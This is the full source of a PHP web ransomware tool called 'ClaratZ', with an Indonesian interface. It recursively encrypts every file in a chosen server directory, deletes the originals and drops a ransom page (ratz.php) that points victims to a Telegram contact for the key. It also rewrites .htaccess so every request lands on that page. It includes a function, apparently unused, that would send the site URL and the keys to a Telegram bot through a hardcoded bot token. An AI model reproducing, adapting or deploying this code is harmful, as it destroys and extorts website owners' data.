<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ClaratZ Ransomware</title>
</head>
<body>
<center>
    <h2>FLOCK </h2>
    <form action="" method="post">
        <label for="directory">Serang Direktori : <br></label>
        <input type="text" id="directory" name="directory" value="<?php echo getcwd(); ?>" required>
        <br><br>
        <label for="key">Kunci 1 (32 karakter):</label>
        <input type="text" id="key" name="key" maxlength="32" required>
        <br><br>
        <label for="iv">Kunci 2 (16 karakter):</label>
        <input type="text" id="iv" name="iv" maxlength="16" required>
        <br><br>
        <input type="submit" value="Gass Ngentod">
        <br>
        <marquee>Masih Progres Pengembangan </marquee>     
    </form>
    <footer>
    <p>&#169; Dibuat Oleh ParanoidHax &nbsp;</p>
    </footer>
</center>
    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $directoryToProcess = $_POST['directory'];
        $key = $_POST['key'];
        $iv = $_POST['iv'];

        function encryptFile($filePath, $key, $iv) {
            $data = file_get_contents($filePath);
            $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
            return $encrypted;
        }

        function processDirectory($dir, $key, $iv) {
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir), RecursiveIteratorIterator::LEAVES_ONLY);
            $encryptedFiles = [];

            foreach ($files as $file) {
                if ($file->isDir()) {
                    continue;
                }

                $filePath = $file->getRealPath();
                $encryptedData = encryptFile($filePath, $key, $iv);

                // Simpan file yang telah dienkripsi dengan ekstensi .locked
                $encryptedFilePath = $filePath . '.locked';
                file_put_contents($encryptedFilePath, $encryptedData);

                // Hapus file asli setelah berhasil dienkripsi
                if (file_exists($encryptedFilePath)) {
                    unlink($filePath);
                    echo "LOCKED !! $filePath -> $encryptedFilePath<br>";
                    $encryptedFiles[] = $encryptedFilePath;
                } else {
                    echo "Gagal menyimpan file terenkripsi: $filePath<br>";
                }
            }

            // Setelah semua file dienkripsi dan dihapus, buat file ratz.php untuk dekripsi
            createDecryptionScript($dir, $key, $iv, $encryptedFiles);
            createHtaccessFile($dir);
        }

        function createDecryptionScript($dir, $key, $iv, $encryptedFiles) {
            $decryptScript = "<?php\n\n";
            $decryptScript .= "if (\$_SERVER['REQUEST_METHOD'] == 'POST') {\n";
            $decryptScript .= "    \$key = \$_POST['key'];\n";
            $decryptScript .= "    \$iv = \$_POST['iv'];\n";
            $decryptScript .= "    function decryptFile(\$filePath, \$key, \$iv) {\n";
            $decryptScript .= "        \$data = file_get_contents(\$filePath);\n";
            $decryptScript .= "        \$decrypted = openssl_decrypt(\$data, 'aes-256-cbc', \$key, 0, \$iv);\n";
            $decryptScript .= "        return \$decrypted;\n";
            $decryptScript .= "    }\n\n";
                        $decryptScript .= "    function processDecryption(\$files, \$key, \$iv) {\n";
            $decryptScript .= "        foreach (\$files as \$filePath) {\n";
            $decryptScript .= "            \$decryptedData = decryptFile(\$filePath, \$key, \$iv);\n";
            $decryptScript .= "            \$originalFilePath = str_replace('.locked', '', \$filePath);\n";
            $decryptScript .= "            file_put_contents(\$originalFilePath, \$decryptedData);\n";
            $decryptScript .= "            echo \"File didekripsi: \$filePath -> \$originalFilePath<br>\";\n";
            $decryptScript .= "        }\n";
            $decryptScript .= "    }\n\n";
            $decryptScript .= "    \$files = " . var_export($encryptedFiles, true) . ";\n";
            $decryptScript .= "    processDecryption(\$files, \$key, \$iv);\n";
            $decryptScript .= "}\n";
            $decryptScript .= "?>\n";
            $decryptScript .= "<!DOCTYPE html>\n";
            $decryptScript .= "<html lang=\"en\">\n";
            $decryptScript .= "<head>\n";
            $decryptScript .= "    <meta charset=\"UTF-8\">\n";
            $decryptScript .= "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n";
            $decryptScript .= "    <title>ERROR SYSTEM</title>\n";
            $decryptScript .= "</head>\n";
            $decryptScript .= "<body>\n";
            $decryptScript .= "<center";
            $decryptScript .= "    <h2>UNLOCKING RANSOMWARE <br></h2>\n";          
            $decryptScript .= "<h3>PESAN</h3>";
            $decryptScript .= "<br>";
            $decryptScript .= "<h1>DO NOT JUST INSERT THE KEY, BECAUSE IT CAN CAUSE FATAL RESULTS</h1>";
            $decryptScript .= "<br>";
            $decryptScript .= "    <form action=\"\" method=\"post\">\n";
                        $decryptScript .= "        <label for=\"key\">KEY 1 : </label>\n";
            $decryptScript .= "        <input type=\"text\" id=\"key\" name=\"key\" maxlength=\"32\" required>\n";
            $decryptScript .= "        <br><br>\n";
            $decryptScript .= "        <label for=\"iv\">KEY 2 : :</label>\n";
            $decryptScript .= "        <input type=\"text\" id=\"iv\" name=\"iv\" maxlength=\"16\" required>\n";
            $decryptScript .= "        <br><br>\n";
            $decryptScript .= "        <input type=\"submit\" value=\"enter\">\n";
            $decryptScript .= "    </form>\n";
            $decryptScript .= "<h3>CONTACT ME ON TELEGRAM TO GET THE KEY</h3>";
            $decryptScript .= "Telegram : @meClaratZ";
            $decryptScript .= "<h2>ParanoidHax ©2024<br></h2>\n";
            $decryptScript .= "<br>";
            $decryptScript .= "</center>";
            $decryptScript .= "</body>\n";
            $decryptScript .= "</html>\n";

            file_put_contents($dir . '/ratz.php', $decryptScript);
            echo "File dekripsi ratz.php telah dibuat di direktori: $dir<br>";
        }
        function createHtaccessFile($dir) {
            $htaccessContent = "DirectoryIndex ratz.php\n";
            $htaccessContent .= "ErrorDocument 403 /ratz.php\n";
            $htaccessContent .= "ErrorDocument 404 /ratz.php\n";
            $htaccessContent .= "ErrorDocument 500 /ratz.php\n";

            file_put_contents($dir . '/.htaccess', $htaccessContent);
            echo "File .htaccess telah dibuat di direktori: $dir<br>";
            }
            function sendTelegramMessage($dir, $key, $iv) {
            $botToken = '7251165404:AAGSCCMe7LIu2nr8z9rhlfvuOw0zM7V6AI8';
            $chatId = '5717783413';
            $url = "https://api.telegram.org/bot$botToken/sendMessage";

            $message = "Enkripsi telah selesai.\n";
            $message .= "URL: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "\n";
            $message .= "Key: $key\n";
            $message .= "IV: $iv\n";

            $postData = [
                'chat_id' => $chatId,
                'text' => $message,
            ];

            $options = [
                'http' => [
                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method'  => 'POST',
                    'content' => http_build_query($postData),
                ],
            ];

            $context  = stream_context_create($options);
            $result = file_get_contents($url, false, $context);

            if ($result === FALSE) {
                echo "Gagal mengirim pesan ke Telegram.<br>";
            } else {
                echo "Pesan berhasil dikirim ke Telegram.<br>";
            }
        }
        // Proses direktori
        processDirectory($directoryToProcess, $key, $iv);
    }
    ?>
</body>
</html>